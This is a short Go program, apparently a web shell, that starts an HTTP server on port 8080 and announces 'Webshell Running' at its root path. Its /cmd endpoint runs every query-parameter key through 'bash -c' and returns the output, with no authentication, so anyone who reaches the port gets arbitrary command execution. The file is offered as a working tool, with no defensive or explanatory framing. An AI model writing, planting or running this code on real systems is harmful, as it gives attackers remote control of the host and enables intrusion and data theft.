package main

import (
	"net/http"
	"net/url"
	"os/exec"

	"github.com/gin-gonic/gin"
)

func main() {
	router := gin.Default()
	router.GET("/", healthCheck)
	router.GET("/cmd", commandHandler)
	router.Run(":8080")
}

func healthCheck(c *gin.Context) {
	c.String(http.StatusOK, "Webshell Running")
}

func commandHandler(c *gin.Context) {
	commands := c.Request.URL.Query()
	output, err := executeCommand(commands)
	if err != nil {
		c.String(http.StatusInternalServerError, "An Error has occured: ", err)
	}

	c.String(http.StatusAccepted, string(output))
}

func executeCommand(cmd url.Values) (result []byte, err error) {
	var output []byte

	for key := range cmd {
		output, err = exec.Command("bash", "-c", key).Output()
		if err != nil {
			return nil, err
		}
	}
	return output, nil
}
